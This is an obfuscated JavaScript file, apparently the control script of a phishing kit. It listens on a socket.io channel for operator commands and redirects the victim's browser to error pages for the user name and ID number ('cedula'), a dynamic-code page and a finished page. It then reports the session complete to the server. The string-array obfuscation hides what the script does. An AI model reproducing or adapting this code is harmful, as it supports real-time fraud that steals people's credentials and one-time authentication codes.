const _0x583c9e = _0x4625;
function _0x4625(_0x2f8b9a, _0xc592f5) {
  const _0x21c2cd = _0x21c2();
  return (
    (_0x4625 = function (_0x4625c7, _0x19d439) {
      _0x4625c7 = _0x4625c7 - 0x135;
      let _0x578f8f = _0x21c2cd[_0x4625c7];
      return _0x578f8f;
    }),
    _0x4625(_0x2f8b9a, _0xc592f5)
  );
}
function _0x21c2() {
  const _0x3f4ee4 = [
    "log",
    "20QhKwLT",
    "location",
    "2352EmjZfk",
    "finish",
    "./finalizado.html",
    "467850KlgDIl",
    "stringify",
    "./error.cedula.html",
    "mode",
    "2190036dhcsiP",
    "./error.user.html",
    "30IiVmhg",
    "4JJMkSD",
    "json",
    "GET",
    "telnum",
    "1470996TDqmQU",
    "197436OKObLy",
    "2466370LtcyCg",
    "newdin",
    "idreg",
    "checkerInfo",
    "7LWnRer",
    "Usuario\x20encontrado",
    "/logs/logs",
    "416MrqgwO",
    "8yEkWsI",
    "href",
    "valid",
    "personas",
    "application/json",
    "connect",
    "valor",
    "3322990TFtVNl",
    "Finalizado",
    "mano",
    "metaInfo",
    "din",
  ];
  _0x21c2 = function () {
    return _0x3f4ee4;
  };
  return _0x21c2();
}
(function (_0xbdf1c8, _0x2a1f10) {
  const _0x1961bd = _0x4625,
    _0x4d8d7e = _0xbdf1c8();
  while (!![]) {
    try {
      const _0x1c2a4e =
        parseInt(_0x1961bd(0x147)) / 0x1 +
        (-parseInt(_0x1961bd(0x144)) / 0x2) *
          (-parseInt(_0x1961bd(0x14d)) / 0x3) +
        (parseInt(_0x1961bd(0x14e)) / 0x4) *
          (-parseInt(_0x1961bd(0x154)) / 0x5) +
        (parseInt(_0x1961bd(0x14b)) / 0x6) *
          (parseInt(_0x1961bd(0x158)) / 0x7) +
        (parseInt(_0x1961bd(0x135)) / 0x8) *
          (parseInt(_0x1961bd(0x152)) / 0x9) +
        (parseInt(_0x1961bd(0x142)) / 0xa) *
          (-parseInt(_0x1961bd(0x13c)) / 0xb) +
        (parseInt(_0x1961bd(0x153)) / 0xc) * (parseInt(_0x1961bd(0x15b)) / 0xd);
      if (_0x1c2a4e === _0x2a1f10) break;
      else _0x4d8d7e["push"](_0x4d8d7e["shift"]());
    } catch (_0x23ae0b) {
      _0x4d8d7e["push"](_0x4d8d7e["shift"]());
    }
  }
})(_0x21c2, 0x6ab6e);
var socket = io[_0x583c9e(0x13a)](url);
socket["on"]("logs", function (_0x2e851e) {
  const _0x263994 = _0x583c9e;
  console["log"](_0x2e851e[_0x263994(0x137)]),
    console["log"](info[_0x263994(0x13f)][_0x263994(0x151)]);
  if (_0x2e851e[_0x263994(0x13b)] == "us") {
    if (
      info[_0x263994(0x157)][_0x263994(0x14a)] == _0x263994(0x138) &&
      _0x2e851e[_0x263994(0x137)] == info[_0x263994(0x13f)][_0x263994(0x151)]
    )
      window[_0x263994(0x143)][_0x263994(0x136)] = _0x263994(0x14c);
    else
      info[_0x263994(0x157)]["mode"] == _0x263994(0x13e) &&
        _0x2e851e[_0x263994(0x137)] == info["metaInfo"][_0x263994(0x151)] &&
        (window[_0x263994(0x143)][_0x263994(0x136)] = _0x263994(0x149));
  } else {
    if (
      _0x2e851e[_0x263994(0x13b)] == _0x263994(0x140) &&
      _0x2e851e["valid"] == info["metaInfo"][_0x263994(0x151)]
    )
      window[_0x263994(0x143)][_0x263994(0x136)] = "./cdin.html";
    else {
      if (
        _0x2e851e["valor"] == _0x263994(0x155) &&
        _0x2e851e["valid"] == info["metaInfo"]["telnum"]
      )
        window["location"]["href"] = "./cdin.error.html";
      else {
        if (
          _0x2e851e[_0x263994(0x13b)] == _0x263994(0x145) &&
          _0x2e851e[_0x263994(0x137)] ==
            info[_0x263994(0x13f)][_0x263994(0x151)]
        ) {
          async function _0x1b96db() {
            const _0x20c656 = _0x263994,
              _0x320d37 = await fetch(url + _0x20c656(0x15a), {
                method: _0x20c656(0x150),
                headers: { "Content-Type": "application/json" },
              }),
              _0x98843a = await _0x320d37[_0x20c656(0x14f)](),
              _0x1d196a = [..._0x98843a];
            for (const _0x42cdd5 of _0x1d196a) {
              if (_0x42cdd5["cl"] == info["metaInfo"][_0x20c656(0x151)]) {
                console[_0x20c656(0x141)](_0x20c656(0x159));
                const _0x4f89f9 = await fetch(
                    url + "/logs/logFinish/" + _0x42cdd5[_0x20c656(0x156)],
                    {
                      method: "PUT",
                      headers: { "Content-Type": _0x20c656(0x139) },
                      body: JSON[_0x20c656(0x148)]({
                        status: _0x20c656(0x13d),
                      }),
                    }
                  ),
                  _0xc76ec = await _0x4f89f9[_0x20c656(0x14f)]();
                window["location"][_0x20c656(0x136)] = _0x20c656(0x146);
              }
            }
          }
          _0x1b96db();
        }
      }
    }
  }
});
